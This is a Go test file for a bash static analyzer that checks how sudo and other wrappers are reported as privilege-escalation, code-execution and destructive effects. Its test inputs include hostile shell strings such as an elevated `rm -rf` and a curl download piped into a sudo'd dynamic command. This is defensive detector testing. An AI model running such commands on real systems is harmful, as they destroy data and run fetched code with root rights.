package analysis

import (
	"strings"
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestSudoElevationReachedFromFrontend pins the end-to-end routing of the
// sudo elevation: the interpreter paths that never reach the ordinary
// binding flow — a wrapper that consumed the whole command line (`sudo -i`),
// a wrapper over a dynamically-named command (`sudo $X`), a wrapper over a
// code-execution sink (`sudo sh -c '…'`) and over a code-executing builtin
// (`sudo eval '…'`) — must still carry the binder's PrivEsc effect in the
// composed report, while non-privilege wrappers (`timeout 5`, `env -S`) and
// the refined -u suppression (`sudo -u nobody …`) stay elevation-free.
func TestSudoElevationReachedFromFrontend(t *testing.T) {
	a := mustAnalyzer(t)

	tests := []struct {
		name string
		src  string
		want bool
	}{
		{"bare sudo -i", `sudo -i`, true},
		{"sudo over dynamic command", `sudo $X`, true},
		{"sudo over dynamic quoted command", `sudo "$X"`, true},
		{"plain sudo command", `sudo whoami`, true},
		{"sudo over a code-execution sink", `sudo sh -c 'rm -rf /opt/x'`, true},
		{"sudo over a code-executing builtin", `sudo eval 'x'`, true},
		{"sudo over a shell-only builtin stays benign-empty", `sudo true`, false},
		{"env over a shell-only builtin stays benign", `env true`, false},
		{"de-elevated sudo over a shell-only builtin stays benign", `sudo -u nobody true`, false},
		{"timeout consumed the line", `timeout 5`, false},
		{"env -S consumed the line", `env -S "cmd"`, false},
		{"sudo -u nobody -i", `sudo -u nobody -i`, false},
		{"flag-only sudo -l runs nothing", `sudo -l`, false},
		{"env above an inert sudo runs nothing", `env sudo -k`, false},
		{"nohup above an inert sudo runs nothing", `nohup sudo -k`, false},
		{"env above a bare sudo runs nothing", `env sudo`, false},
		{"nested sudo over -k runs nothing", `sudo sudo -k`, false},
		{"command word after -k still runs above wrappers", `env sudo -k whoami`, true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			rep := a.Analyze(LangBash, tc.src)
			if rep == nil {
				t.Fatal("nil report")
			}
			n := 0
			for _, e := range rep.Effects {
				if e.Kind == engine.KindPrivEsc {
					n++
				}
			}
			if tc.want && n == 0 {
				t.Errorf("%q: no PrivEsc effect in report (%d effects)", tc.src, len(rep.Effects))
			}
			if !tc.want && n > 0 {
				t.Errorf("%q: unexpected PrivEsc effect(s): %d", tc.src, n)
			}
		})
	}
}

// TestSudoInertLineAboveWrappers pins the position-scoped inertness at the
// composed-report level: `env sudo -k` and `nohup sudo -k` exec a sudo that
// resets its cached credentials and exits, so the report carries the
// interpreter's wrapper-consumed-line ⊤ and the binder's runs-no-command
// note — no PrivEsc claim, and no "the command still runs" note, which would
// lie about a line that executes nothing (SECURITY.md: such a line fabricates
// no PrivEsc effect and carries no escalation claim). A command word after
// the inert flag still runs above any wrappers.
func TestSudoInertLineAboveWrappers(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{`env sudo -k`, `nohup sudo -k`, `env sudo`, `sudo sudo -k`, `sudo -k sudo -l`, `sudo -k env sudo -l`} {
		rep := a.Analyze(LangBash, src)
		if rep == nil {
			t.Fatalf("%s: nil report", src)
		}
		if n := countKind(rep.Effects, engine.KindPrivEsc); n != 0 {
			t.Errorf("%s: the line runs no privileged command: %d PrivEsc effect(s)", src, n)
		}
		if !rep.HasTop() || !rep.Conservative {
			t.Errorf("%s: the wrapper-consumed line must degrade to the interpreter's ⊤ (conservative)", src)
		}
		if notes := strings.Join(rep.Notes, " "); strings.Contains(notes, "the command still runs") {
			t.Errorf("%s: nothing runs on the line, the still-runs note would lie: %v", src, rep.Notes)
		}
	}
	rep := a.Analyze(LangBash, `env sudo -k`)
	if notes := strings.Join(rep.Notes, " "); !strings.Contains(notes, "-k invalidates cached credentials and runs no command") {
		t.Errorf("env sudo -k: expected the runs-no-command note, notes=%v", rep.Notes)
	}
	up := a.Analyze(LangBash, `env sudo -k whoami`)
	if n := countKind(up.Effects, engine.KindPrivEsc); n != 1 {
		t.Errorf("env sudo -k whoami: the command word runs despite -k: want 1 PrivEsc, got %d", n)
	}
}

// TestSudoElevationInertEnvWriteResidual pins the accepted precision residual
// (SECURITY.md Known Risks): on an inert wrapper line nothing executes — no
// PrivEsc, ⊤ verdict — but the environment writes the bash interpreter
// recorded at peel time are not retracted and survive into the composed
// report, for both documented shapes: the wrapper-donated one
// (`sudo -l env FOO=1 …`) and a leading assignment (`VAR=1 sudo -l …`).
func TestSudoElevationInertEnvWriteResidual(t *testing.T) {
	a := mustAnalyzer(t)
	for _, tc := range []struct {
		src string
		env string
	}{
		{"sudo -l env FOO=1 touch /opt/x", "FOO"},
		{"VAR=1 sudo -l touch /opt/x", "VAR"},
	} {
		t.Run(tc.src, func(t *testing.T) {
			rep := a.Analyze(LangBash, tc.src)
			if rep == nil {
				t.Fatal("nil report")
			}
			if n := countKind(rep.Effects, engine.KindPrivEsc); n != 0 {
				t.Errorf("the line runs nothing: %d PrivEsc effects", n)
			}
			top := false
			envWrite := false
			for _, e := range rep.Effects {
				if e.Kind == engine.KindCodeExec && e.Target.IsTop() {
					top = true
				}
				if e.Kind == engine.KindEnvWrite && e.Target.Contains(tc.env) {
					envWrite = true
				}
			}
			if !top || !rep.Conservative {
				t.Errorf("the inert line must degrade to ⊤ (conservative)")
			}
			if !envWrite {
				t.Errorf("expected the documented EnvWrite residual for the %s assignment", tc.env)
			}
		})
	}
}

// TestSudoElevationSubsumedDestructiveResidual pins the accepted destructive-
// channel residual (SECURITY.md Known Risks): on the builtin shape the
// destructive table row contributed by the consult survives the interpreter's
// ⊤-subsumption — `sudo eval 'x'` reports the eval entry's class-D finding
// beside a ⊤ verdict — while the sink shape (`sudo sh -c '…'`, whose inner
// name resolves to nothing) reports no row. The divergence between the two
// channels is deliberate and documented.
func TestSudoElevationSubsumedDestructiveResidual(t *testing.T) {
	a := mustAnalyzer(t)
	rep := a.Analyze(LangBash, `sudo eval 'x'`)
	if rep == nil {
		t.Fatal("nil report")
	}
	if len(rep.Destructive) == 0 {
		t.Errorf("expected the documented destructive-row residual for the eval consult, got none (effects %d)", len(rep.Effects))
	}
	sink := a.Analyze(LangBash, `sudo sh -c 'rm -rf /opt/x'`)
	if sink == nil {
		t.Fatal("nil report")
	}
	if len(sink.Destructive) != 0 {
		t.Errorf("the sink shape must report no destructive row: %v", sink.Destructive)
	}
	if n := countKind(sink.Effects, engine.KindPrivEsc); n != 1 {
		t.Errorf("the sink shape must still elevate exactly once: %d PrivEsc", n)
	}
}

// countKind counts report effects of one kind.
func countKind(effects []engine.Effect, kind engine.EffectKind) int {
	n := 0
	for _, e := range effects {
		if e.Kind == kind {
			n++
		}
	}
	return n
}

// TestWrapperOverShellOnlyBuiltinStaysBenign pins the collateral-benign guard:
// a resolver result without elevation evidence folds nothing through the seam,
// so a wrapper over an effect-free shell-only builtin (`env true`,
// `sudo -u nobody true`, `sudo true` itself) stays a benign empty report —
// the documented precision residual for shell-only builtins (SECURITY.md
// Known Risks); no ⊤/Critical may be fabricated for them. The quoted attached
// spelling `sudo -u"$X" true` belongs here too: its expansion is one field, so
// the peel absorbs it and the line really runs the no-op builtin — unlike the
// unquoted form pinned by TestSudoUnquotedDynamicOptionKeepsTop.
func TestWrapperOverShellOnlyBuiltinStaysBenign(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{`env true`, `nohup true`, `timeout 5 true`, `sudo -u nobody true`, `sudo -g wheel true`, `sudo true`, `sudo exit`, `sudo -u"$X" true`, `sudo --user="$X" true`} {
		rep := a.Analyze(LangBash, src)
		if rep == nil {
			t.Fatalf("%s: nil report", src)
		}
		if len(rep.Effects) != 0 || rep.Conservative || rep.Top {
			t.Errorf("%s: must stay benign, got %d effect(s), conservative=%v top=%v", src, len(rep.Effects), rep.Conservative, rep.Top)
		}
		if rep.Destructive != nil {
			t.Errorf("%s: unexpected destructive entries: %v", src, rep.Destructive)
		}
	}
}

// TestSudoUnquotedDynamicOptionKeepsTop pins the soundness boundary of the
// attached dynamic spellings: bash field-splits the expansion of an unquoted
// part, so `sudo -u$X true` can expand into several argv fields — an option
// value plus free-standing words sudo reads as its own command line. The
// normalizer therefore records the (unsatisfied) options but never absorbs the
// word: it stays the dynamically-named inner command, and the analysis must
// degrade to ⊤ CodeExec (conservative) over the certain unresolved-target
// elevation instead of reporting the literally following builtin benign. A
// listing prefix (`-lu$X`) decides the line inert instead — sudo lists and
// runs nothing — so only the conservative ⊤ is pinned for it.
func TestSudoUnquotedDynamicOptionKeepsTop(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{`sudo -u$X true`, `sudo --user=$X true`} {
		rep := a.Analyze(LangBash, src)
		if rep == nil {
			t.Fatalf("%s: nil report", src)
		}
		if !rep.Conservative || !rep.HasTop() {
			t.Errorf("%s: the field-splitting spelling must degrade to a conservative ⊤ report, got conservative=%v top=%v", src, rep.Conservative, rep.HasTop())
		}
		if countKind(rep.Effects, engine.KindCodeExec) == 0 {
			t.Errorf("%s: expected a ⊤ CodeExec effect, got none", src)
		}
		if countKind(rep.Effects, engine.KindPrivEsc) == 0 {
			t.Errorf("%s: expected the unresolved-target elevation beside the ⊤, got none", src)
		}
	}
	for _, src := range []string{`sudo -lu$X true`} {
		rep := a.Analyze(LangBash, src)
		if rep == nil {
			t.Fatalf("%s: nil report", src)
		}
		if !rep.Conservative || !rep.HasTop() {
			t.Errorf("%s: the field-splitting spelling must degrade to a conservative ⊤ report, got conservative=%v top=%v", src, rep.Conservative, rep.HasTop())
		}
		if countKind(rep.Effects, engine.KindPrivEsc) != 0 {
			t.Errorf("%s: the listing prefix decides the line inert — unexpected PrivEsc effect(s)", src)
		}
	}
}

// TestSudoElevationNoDuplicateTop pins the cradle-flow dedup: a downloaded
// payload piped into a sudo'd dynamically-named command produces ONE ⊤ CodeExec
// row (the interpreter's, carrying the cradle role) — the binder's own ⊤ for
// the same unbindable call is subsumed, and Report.Normalize keys the merge on
// the flow role, so without the drop the report carried two ⊤ rows. The
// binder's "unresolved command … assuming ⊤" note may survive the effect-level
// subsumption (the resolver seam carries no notes — see exec-resolver.md);
// the test pins it to at most one occurrence.
func TestSudoElevationNoDuplicateTop(t *testing.T) {
	a := mustAnalyzer(t)
	for _, tc := range []struct {
		name string
		src  string
	}{
		{"cradle pipeline", `curl -s http://e/x | sudo $X`},
		{"sudo over a sink", `sudo sh -c 'rm -rf /opt/x'`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rep := a.Analyze(LangBash, tc.src)
			if rep == nil {
				t.Fatal("nil report")
			}
			n := 0
			for _, e := range rep.Effects {
				if e.Kind == engine.KindCodeExec && e.Target.IsTop() {
					n++
				}
			}
			if n != 1 {
				t.Errorf("%s: got %d ⊤ CodeExec rows, want exactly 1 (%d effects)", tc.src, n, len(rep.Effects))
			}
			found := false
			for _, e := range rep.Effects {
				if e.Kind == engine.KindPrivEsc {
					found = true
				}
			}
			if !found {
				t.Errorf("%s: the sudo elevation went missing", tc.src)
			}
			saw := 0
			for _, note := range rep.Notes {
				if strings.Contains(note, "unresolved command") && strings.Contains(note, "assuming ⊤") {
					saw++
				}
			}
			if saw > 1 {
				t.Errorf("%s: %d subsumed-⊤ binder notes, want at most one: %v", tc.src, saw, rep.Notes)
			}
		})
	}
}
